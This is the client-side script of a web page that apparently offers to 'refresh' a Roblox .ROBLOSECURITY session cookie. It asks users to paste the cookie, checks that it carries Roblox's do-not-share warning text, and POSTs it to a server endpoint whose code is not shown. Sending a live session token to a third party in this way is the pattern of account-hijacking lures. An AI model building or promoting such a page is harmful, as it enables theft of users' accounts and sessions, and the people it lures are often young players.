    <script>
        const API_URL = '/api/refresh';

        async function refreshCookie() {
            const cookieInput = document.getElementById('cookie');
            const cookie = cookieInput.value.trim();
            const resultDiv = document.getElementById('result');
            const refreshBtn = document.getElementById('refreshBtn');
            
            if (!cookie) {
                showResult('Please enter a .ROBLOSECURITY cookie', 'error');
                return;
            }
            
            // Basic validation
            if (!cookie.includes('_|WARNING:-DO-')) {
                showResult('Invalid cookie format. Make sure this is a valid .ROBLOSECURITY cookie', 'error');
                return;
            }
            
            // Show loading state
            refreshBtn.disabled = true;
            refreshBtn.innerHTML = '<span class="loading"></span> Refreshing...';
            resultDiv.style.display = 'none';
            
            try {
                const response = await fetch(API_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ cookie: cookie })
                });
                
                const data = await response.json();
                
                if (!response.ok) {
                    throw new Error(data.error || 'Failed to refresh cookie');
                }
                
                if (data.success) {
                    showResult(
                        '✅ Cookie refreshed successfully! Here is your new cookie:', 
                        'success', 
                        data.cookie
                    );
                    cookieInput.value = data.cookie;
                } else {
                    throw new Error(data.error || 'Unknown error occurred');
                }
            } catch (error) {
                showResult(`❌ Error: ${error.message}`, 'error');
            } finally {
                refreshBtn.disabled = false;
                refreshBtn.innerHTML = '🔄 Refresh Cookie';
            }
        }
        
        function showResult(message, type, cookie = null) {
            const resultDiv = document.getElementById('result');
            resultDiv.className = `result ${type}`;
            
            if (cookie) {
                resultDiv.innerHTML = `
                    <strong>${message}</strong>
                    <div class="result-content">${escapeHtml(cookie)}</div>
                    <button class="copy-btn" onclick="copyToClipboard('${escapeHtml(cookie).replace(/'/g, "\\'")}')">
                        📋 Copy to Clipboard
                    </button>
                `;
            } else {
                resultDiv.innerHTML = `<strong>${message}</strong>`;
            }
            
            resultDiv.style.display = 'block';
            
            // Auto-hide after 10 seconds for success messages
            if (type === 'success') {
                setTimeout(() => {
                    if (resultDiv.style.display === 'block') {
                        resultDiv.style.opacity = '0';
                        setTimeout(() => {
                            resultDiv.style.display = 'none';
                            resultDiv.style.opacity = '1';
                        }, 300);
                    }
                }, 10000);
            }
        }
        
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                const btn = event.target;
                const originalText = btn.innerHTML;
                btn.innerHTML = '✅ Copied!';
                setTimeout(() => {
                    btn.innerHTML = originalText;
                }, 2000);
            }).catch(() => {
                alert('Failed to copy to clipboard');
            });
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        // Add enter key support (Ctrl+Enter to refresh)
        document.getElementById('cookie').addEventListener('keydown', (e) => {
            if (e.ctrlKey && e.key === 'Enter') {
                refreshCookie();
            }
        });
